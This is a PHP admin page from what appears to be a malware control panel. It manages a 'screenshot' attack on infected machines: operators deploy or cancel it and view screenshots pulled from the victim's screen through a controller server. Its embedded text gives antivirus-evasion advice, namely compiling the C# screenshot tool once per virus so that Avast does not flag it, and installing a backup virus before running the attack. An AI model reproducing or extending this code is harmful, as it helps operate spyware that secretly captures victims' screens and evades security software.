<?php

use Kelvinho\Virus\Attack\AdminTemplates;
use Kelvinho\Virus\Attack\AttackInterface;
use Kelvinho\Virus\Header;
use function Kelvinho\Virus\logAttackStatus;

if (!isset($_SESSION["attack_id"])) {
    header("Location: " . DOMAIN);
    Header::redirect();
} else {
    $attack = AttackInterface::get($_SESSION["attack_id"]);
    ?>
    <html lang="en_US">
    <?php echo AdminTemplates::header(); ?>
    <body>
    <?php echo AdminTemplates::body($attack); ?>
    <div class="w3-button w3-red" onclick="update()">Update</div>
    <?php switch ($attack->getStatus()) {
        case AttackInterface::STATUS_DORMANT: ?>
            <p>This attack is dormant. Click <a onclick="deployAttack()" class="link">here</a> to deploy.</p>
            <p>Please note that taking a screenshot is quite complicated, and is something batch can't do. So, this
                attack is made possible by compiling a C# script on the host machine and then run that executable. This
                can be dangerous. Batch scripts never get detected by antiviruses, while weird executables will be
                monitored closely. A previous version of this attack always compile the screenshot code every time a
                screenshot is desired, which eventually triggers avast. So, I have made the compilation process once for
                each virus in hopes that avast won't detect it anymore, and it works. However, other antiviruses can
                still detect this. So, it's a good idea to install a back up virus somewhere else, then do this.</p>
            <?php break;
        case AttackInterface::STATUS_DEPLOYED: ?>
            <p>This attack is deployed. Click <a onclick="cancelAttack()" class="link">here</a> to cancel the attack.
            </p>
            <?php break;
        case AttackInterface::STATUS_EXECUTED: ?>
            <p>This attack is executed. Here is the screenshot:</p>
            <div>
                <img src="<?php echo DOMAIN_CONTROLLER . "/getFile.php?file=screen.png"; ?>" width=100%
                     alt="screenshot">
            </div>
            <?php break;
        default:
            logAttackStatus($attack->getStatus());
    } ?>
    </body>
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.4/jquery.min.js"></script>
    <script type="text/javascript" src="https://157239n.com/page/assets/js/main.js"></script>
    <script type="application/javascript">
        function update() {
            $.ajax({
                url: "<?php echo DOMAIN_CONTROLLER . "/updateAttack.php"; ?>",
                type: "POST",
                data: {
                    virus_id: "<?php echo $attack->getVirusId(); ?>",
                    attack_id: "<?php echo $attack->getAttackId(); ?>",
                    name: $("#name").val(),
                    profile: $("#profile").val()
                },
                success: function () {
                    window.location = "<?php echo DOMAIN_ATTACK_INFO; ?>"
                }
            });
        }
    </script>
    <?php echo AdminTemplates::script($attack); ?>
    </html>
<?php } ?>
